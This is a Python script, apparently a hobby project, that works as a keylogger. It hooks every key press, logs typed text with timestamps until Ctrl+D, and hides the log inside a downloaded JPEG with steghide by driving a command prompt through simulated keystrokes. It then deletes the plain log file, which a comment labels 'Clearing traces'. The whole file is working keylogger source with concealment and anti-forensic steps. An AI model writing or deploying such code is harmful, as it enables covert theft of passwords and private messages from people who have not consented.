# Importing required modules
import keyboard
import time
import os

# Records of keystrokes
pressed_key = []
sentence = ''

# Vital Functions
def logger(event) -> None:
    '''Maintaing the detected keystrokes and move these strokes in the records in an appropriate way'''
    global sentence
    key = event.name
    if len(event.name) > 1:
        if event.name == 'space':
            key = " "
            sentence += key
        elif event.name == 'enter':
            pressed_key.append((time.asctime(time.localtime()), sentence))
            pressed_key.append((time.asctime(time.localtime()),
                               f'{event.name.upper()} >> after --> {sentence}'))
            sentence = ''
        else:
            if sentence != '':
                pressed_key.append((time.asctime(time.localtime()), sentence))
                pressed_key.append((time.asctime(
                    time.localtime()), f'{event.name.upper()} >> after --> {sentence}'))
    else:
        sentence += key


def download(url: str = 'https://cdn.pixabay.com/photo/2020/02/06/09/39/summer-4823612_960_720.jpg', file_name: str = 'image.jpg') -> None:
    '''Image downloading using external resource'''
    # Modules to communicate over internet
    import requests  # request img from web
    import shutil
    res = requests.get(url, stream=True)
    if res.status_code == 200:
        with open(file_name, 'wb') as f:
            shutil.copyfileobj(res.raw, f)


def save() -> None:
    '''Saving the records in a text file'''
    with open(f'{os.getcwd()}\logs.txt', 'w') as file:
        for i in pressed_key:
            file.write(f'key enter is : \'{i[1]}\'\nTime : {i[0]}\n\n')


# Downloading an image if not present in the path
if os.path.exists(f"{os.getcwd()}\image.jpg") == False:
    download()

# Detecting and then saving the keystrokes
keyboard.on_press(logger)
keyboard.wait(hotkey='control+d')
save()

# Automation

# --Giving some time after each task
time.sleep(2)

# --Command promt open
keyboard.press_and_release('win+r')
time.sleep(0.5)
keyboard.write('cmd')
time.sleep(0.5)
keyboard.press_and_release('enter')
time.sleep(0.5)

# --Steganography
keyboard.write(
    f'steghide embed -ef {os.getcwd()}\logs.txt -cf {os.getcwd()}\image.jpg -p sidd')
keyboard.press_and_release('enter')
time.sleep(0.5)

# --Command prompt closed
keyboard.write('exit')
keyboard.press_and_release('enter')

# --Clearing traces
os.remove(f'{os.getcwd()}\logs.txt')
